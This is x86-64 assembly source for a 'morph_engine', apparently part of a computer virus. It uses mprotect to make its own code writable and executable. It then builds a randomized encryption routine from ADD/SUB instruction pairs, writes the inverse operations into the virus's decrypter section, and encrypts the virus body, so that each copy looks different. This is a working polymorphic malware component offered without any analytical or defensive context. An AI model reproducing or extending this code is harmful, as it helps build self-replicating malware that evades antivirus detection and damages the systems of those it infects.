%include "template.asm.inc"

global morph_engine

extern rand
%define OPCODE_ADD_REG 0x01
%define OPCODE_SUB_REG 0x29

section .data

	ModRegRM  dd 0xCB, 0xD8, 0xC1, 0xC8, 0xD0, 0xD1, 0xD9, 0xC2, 0xCA, 0xDA, 0xC3, 0xD3

section .text


morph_engine:
;create stack frame
push rbp
mov  rbp, rsp
sub  rsp, 0x28
push rbx
push r12
push r13
push r14
push r15

;save data of using registers
mov [rbp-0x28], rdi ; virus data
mov [rbp-0x20], rsi ; offset of encrypt section
mov [rbp-0x18],	rdx ; size of virus in hexa
mov [rbp-0x10],	rcx ; offset of decrypter section



; do stuff here
call getpagesize
; rax has 0x1000
mov rcx, rax
; save rax for later use when passing to mprotect
sub	rcx, 0x1
not rcx
mov	rdi, .encryption_function
and rdi, rcx
; AND them and the result will be stored in rcx
; rdi must hold the page_start address
mov rsi, rax
; rsi must have the page length
mov rdx, 0x7
; read+write+exec = 0x7
call mprotect



; set up needed values
mov r12, .encryption_function
mov rbx, .encryption_function
add rbx, FUNC_SIZE
sub rbx, 0x1
; must use rbx here because rbx is the only one that will not change on rand call later
mov r13, [rbp-0x28]
add r13, [rbp-0x10] 
add r13, FUNC_SIZE
; end of 
mov r15, ModRegRM



.encrypt_logic_loop:
	call rand
	xor rdx, rdx
	mov rcx, 2
	div rcx
	cmp r12, rbx
	;end encryption and jump to end
	ja .encrypt_function_load_values
	jmp [.jump_function_table+rdx*8]
	align 4
	.jump_function_table: dq .func_add_reg,
						  dq .func_add_nop




.func_add_reg:
	call rand
	xor rdx, rdx
	mov rcx, 12
	div rcx
	cmp r12, rbx

	sub r13, 0x2
	xor rax, rax
	mov al, [r15+rdx*4]
	; this will always result in and address that contains an modregrm opcode
	xor rcx, rcx
	mov ch, al
	mov ah, OPCODE_ADD_REG
	mov cl, OPCODE_SUB_REG
	xchg al, ah
	mov [r12], ax
	mov [r13], cx
	add r12, 0x2
	jmp .encrypt_logic_loop



.func_add_nop:
; just move the pointer up and down for encrypt/decrypt
	sub r13, 0x2
	add r12,0x2
	jmp .encrypt_logic_loop



.encrypt_function_load_values:

	mov rbx, [rbp-0x28]
	mov rsi, [rbp-0x20]
	add rsi, rbx
	; rsi = full address of virus.start
	mov rdi, [rbp-0x18]
	add rdi, rsi
	; rdi = full address of the virus.end


.encryption_loop:
	; load first 16bytes of memory data to registers
	mov eax, [rsi]
	mov ebx, [rsi+0x4]
	mov ecx, [rsi+0x8]
	mov edx, [rsi+0xC]

.encryption_function:
	times FUNC_SIZE db OP_NOP
	; put back the data to where it was taken from
	mov [rsi], eax
	mov [rsi+0x4], ebx
	mov [rsi+0x8], ecx
	mov [rsi+0xC], edx
	add rsi, 0x10
	; add 10h to rsi, fast forwards rsi to decrypt next 16bytes
	cmp rsi, rdi
	;compare if rsi = rdi, signalling end of decryption
	jne .encryption_loop




xor rax,rax 
; this will ensure rax = 0 , means completed without error
pop r15
pop r14
pop r13
pop r12
pop rbx
mov rsp, rbp
pop rbp
ret